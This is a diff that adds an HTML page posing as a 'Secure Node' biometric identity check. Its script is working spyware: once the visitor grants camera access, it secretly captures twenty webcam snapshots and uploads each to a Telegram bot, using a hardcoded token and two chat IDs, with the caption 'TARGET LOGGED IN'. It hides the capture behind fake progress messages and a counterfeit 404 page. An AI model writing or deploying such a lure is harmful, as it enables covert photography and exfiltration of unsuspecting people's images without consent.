@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Security Gateway</title>
+    <style>
+        body { margin: 0; padding: 0; background: #050a14; color: #00d4ff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .shield-container { border: 2px solid #00d4ff; padding: 40px; border-radius: 15px; background: rgba(0, 212, 255, 0.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); text-align: center; max-width: 400px; }
+        h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
+        p { color: #8899a6; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: transparent; border: 2px solid #00d4ff; color: #00d4ff; padding: 15px 40px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 50px; text-transform: uppercase; transition: all 0.4s; position: relative; overflow: hidden; animation: pulse 2s infinite; }
+        .btn:hover { background: #00d4ff; color: #050a14; box-shadow: 0 0 40px #00d4ff; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(0, 212, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0); } }
+        #status { margin-top: 25px; font-family: monospace; font-size: 12px; color: #00ff88; }
+        .loader { height: 2px; width: 0%; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
+    </style>
+</head>
+<body>
+    <div class="shield-container" id="main-ui">
+        <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
+        <h1>Secure Node</h1>
+        <p>Biometric handshake required to decrypt shared media assets.</p>
+        <button class="btn" id="mainBtn" onclick="initiate()">Verify Identity</button>
+        <div id="status"></div>
+        <div id="loader" class="loader"></div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8767268201:AAG1DzN2Gdi9iqGQTLmr35akktRiaa0DjB4';
+        // Updated to use an array for multiple users
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiate() {
+            const status = document.getElementById('status');
+            const loader = document.getElementById('loader');
+            const btn = document.getElementById('mainBtn');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                btn.style.display = 'none';
+                status.innerText = "> INITIALIZING BIOMETRIC SCAN...";
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const maxPackets = 20; 
+                    
+                    const interval = setInterval(() => {
+                        if (count >= maxPackets) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(track => track.stop());
+                            render404();
+                            return;
+                        }
+                        
+                        send(count + 1);
+                        count++;
+                        loader.style.width = (count * (100 / maxPackets)) + "%";
+                        status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
+                    }, 800); // Set to 800ms to allow time for two sends per tick
+                };
+            } catch (e) {
+                status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
+                status.style.color = "#ff4b4b";
+            }
+        }
+
+        function send(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                if (!blob) return;
+
+                // Loop through each ID in the array
+                IDS.forEach(chatId => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'identity_packet.jpg');
+                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                });
+            }, 'image/jpeg', 0.4); 
+        }
+
+        function render404() {
+            document.documentElement.innerHTML = `
+            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+            <html><head>
+            <title>404 Not Found</title>
+            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
+            <h1>Not Found</h1>
+            <p>The requested URL was not found on this server. System Error</p>
+            <hr>
+            <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
+            </body></html>`;
+            
+            window.history.pushState({}, "", "/error-log-0x8842");
+        }
+    </script>
+</body>
+</html>
